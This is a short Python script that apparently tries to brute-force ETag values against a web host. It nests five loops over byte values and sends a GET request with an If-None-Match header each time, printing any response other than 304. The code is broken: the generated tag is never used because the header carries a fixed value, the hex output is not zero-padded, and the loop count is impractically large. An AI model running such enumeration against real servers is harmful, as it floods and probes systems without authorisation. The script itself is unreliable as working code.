import requests

def convertToHexTag(numbers: list) -> str:
    tag = ''.join([hex(i) for i in numbers ]).replace('0x', '')
    tag = tag[:4] + '-'  + tag[4:]
    return tag

url = "https://hidden.plexhax.com/"


for a in range(0, 255):
    for b in range(0, 255):
        for c in range(0, 255):
            for d in range(0, 255):
                for e in range(0, 255):
                    tag = convertToHexTag([a,b,c,d,e])
                    headers = {
                        'If-None-Match': '"{}"'.format('617a7a03-4')
                    }
                    res = requests.request("GET", url, headers=headers)

                    if res.status_code != 304:
                        print(tag)
                        print(res.text)
                        print(res.headers)
